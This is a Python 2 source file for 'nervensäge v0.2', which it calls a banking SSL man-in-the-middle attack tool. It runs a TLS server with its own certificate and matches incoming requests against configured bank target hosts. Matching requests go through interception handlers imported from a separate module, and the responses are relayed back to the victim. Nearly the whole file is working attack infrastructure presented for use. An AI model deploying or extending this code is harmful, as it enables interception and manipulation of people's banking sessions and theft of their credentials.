#!/usr/bin/python
# -*- coding: UTF-8 -*-

import socket
import httplib
import os
import threading
import urllib

from SocketServer import BaseServer, ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from OpenSSL import SSL
from urlparse import parse_qs
from copy import deepcopy
from banking import Config, Colors,  MITMResponseHandler,  MITMRequestHandler

config = Config()

class SecureHTTPServer(ThreadingMixIn, HTTPServer):
    """
    SSL wrapper and threading support for httpserver class
    """
    
    def __init__(self, HandlerClass):
        self.cfg,  self.profiles = config.get_config()
        BaseServer.__init__(self, (self.cfg['address'],  int(self.cfg['port'])), HandlerClass)
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        ctx.use_privatekey_file (self.cfg['keyfile'])
        ctx.use_certificate_file(self.cfg['certfile'])
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
        self.server_bind()
        self.server_activate()

class SecureHTTPRequestHandler(BaseHTTPRequestHandler):
    """
    Request handler which invokes the supported mitm request/response handler
    """
    
    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def send_response(self, code, message=None):
        if message is None:
            if code in self.responses:
                message = self.responses[code][0]
            else:
                message = ''
        if self.request_version != 'HTTP/0.9':
            self.wfile.write("%s %d %s\r\n" % (self.protocol_version, code, message))
        self.send_header('Server', self.version_string())
        self.send_header('Date', self.date_time_string())
        
    def handle(self):
        SocketErrors = (socket.error, SSL.ZeroReturnError, SSL.SysCallError, SSL.Error)
        #try:
        BaseHTTPRequestHandler.handle(self)
        #except SocketErrors, exce:
            #self.connection.shutdown()

    def do_GET(self):
        self.do_REQUEST()

    def do_POST(self):
        self.do_REQUEST()

    def do_REQUEST(self):
        self.cfg, self.profiles = config.get_config()
        for profile in self.profiles.keys():
            if self.profiles[profile]['target_host'] == self.headers['Host']:
                request = MITMRequestHandler(self.command, self.path, self.rfile, dict(self.headers), self.profiles[profile],  self.cfg)
                request.run()

                response = MITMResponseHandler(request, self.profiles[profile],  self.cfg)
                response.run()
                
        print response.status
        self.send_response(response.status)     
        for header, value in response.getheaders():
            if header == "connection" or header == "keep-alive":
                pass
            else:
                self.send_header(header, value)
        self.end_headers()
        
        self.wfile.write(response.read())
        self.wfile.flush() 
        
        return

def main():    
    print "=== nervensäge v0.2 - banking ssl-mitm attack tool ==="
    print "=== (c) 2010 - Christian Eichelmann                ===\n"
    
    cc = Colors()
    
    try:
        httpd = SecureHTTPServer(SecureHTTPRequestHandler)
        sa = httpd.socket.getsockname()
        cc.cc_ok("starting MITM-HTTPS on %s:%d\n\n" % (sa[0],  sa[1]))
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()
